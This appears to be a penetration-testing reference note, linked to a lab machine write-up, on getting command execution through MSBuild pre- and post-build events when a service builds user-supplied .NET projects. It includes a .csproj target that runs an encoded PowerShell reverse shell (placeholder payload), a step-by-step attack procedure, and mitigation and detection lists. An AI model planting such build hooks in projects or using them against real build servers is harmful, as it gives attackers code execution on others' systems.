---
topic: MSBuild — command execution in build events
tags: [windows, msbuild, dotnet, rce, visual, gitea]
---

# MSBuild — command execution in build events

[🌐 Español](visual-studio-build-rce.md) | **English**

## Concept

A Visual Studio project can run commands before or after building through `PreBuildEvent`, `PostBuildEvent` or a `Target` with `BeforeTargets`. If a service builds user-supplied projects, the project is executable code even without malicious code in the `.cs` files.

On Visual, the site cloned a Git repository and ran `msbuild` on the `.sln`; a `.csproj` with a `PreBuild` target gave a shell as `enox`.

## When it applies

- A service builds repositories or solutions supplied by users.
- `msbuild`, `dotnet build` or Visual Studio processes untrusted projects.
- The build process has network, secret or webroot access.
- On Visual, the server cloned over HTTP and returned binaries under `/uploads/<hash>/`.

## Procedure

1. Create a .NET project with a `.sln`.
2. Add a target or event to the `.csproj`.
3. Publish it to a repository the service can reach (your own Gitea).
4. Submit the URL and wait for the build.
5. Catch the shell or verify the command.

## Commands

```xml
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="powershell -e <BASE64_REVERSE_SHELL>" />
</Target>
```

```xml
<PropertyGroup>
  <PreBuildEvent>calc.exe</PreBuildEvent>
</PropertyGroup>
```

```bash
msbuild project.sln /p:Configuration=Release
dotnet build project.sln
```

## Variants

- `PostBuildEvent` to run after producing the binary.
- `BeforeBuild`, `AfterBuild` or a target with `DependsOnTargets`.
- A `.props` or `.targets` file imported by the project.
- An `Exec` task inside a conditional target.

## Limitations

- The service may build in a container without network or a shell.
- `msbuild` may be restricted to signed projects or an allowlist.
- The repository must be reachable from the server.
- PowerShell may run in restricted mode.

## Mitigation

- Do not build user code on the host; use ephemeral containers without secrets.
- Review or block `Exec`, `PreBuildEvent` and `PostBuildEvent`.
- Build with a low-privilege account and no webroot access.
- Sign projects and validate the repository before building.
- Monitor `msbuild`, `csc` and unexpected child processes.

## Detection

- `.csproj` files containing `Exec`, `PreBuildEvent` or `PostBuildEvent`.
- `msbuild` spawning `powershell`, `cmd` or `curl`.
- Git clones from the build server to external hosts.
- New binaries in `/uploads` and webshells in `htdocs`.

## References

- [Microsoft — MSBuild targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [Microsoft — PreBuildEvent](https://learn.microsoft.com/en-us/visualstudio/msbuild/common-msbuild-project-properties)
- [0xdf — Visual](https://0xdf.gitlab.io/2024/02/24/htb-visual.html)
- [Visual writeup](../../machines/windows/visual/README.en.md)
